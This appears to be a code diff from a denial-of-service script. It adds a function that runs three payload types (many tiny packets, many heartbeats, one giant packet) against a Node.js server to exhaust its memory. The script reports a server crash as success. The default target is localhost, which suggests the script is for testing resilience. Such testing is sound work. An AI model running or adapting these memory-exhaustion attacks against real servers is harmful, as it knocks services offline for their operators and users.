@@ -119,3 +119,9 @@ def oom_nodejs(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, make_pa
         print("Server no longer responds :)")
     else:
         print("Server survived :(")
+
+
+def oom_nodejs_all(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX):
+    for make_payload in (many_tiny_packets, many_heartbeats, giant_packet):
+        print("Trying payload type:", make_payload.__name__)
+        oom_nodejs(host, payload_length, make_payload)
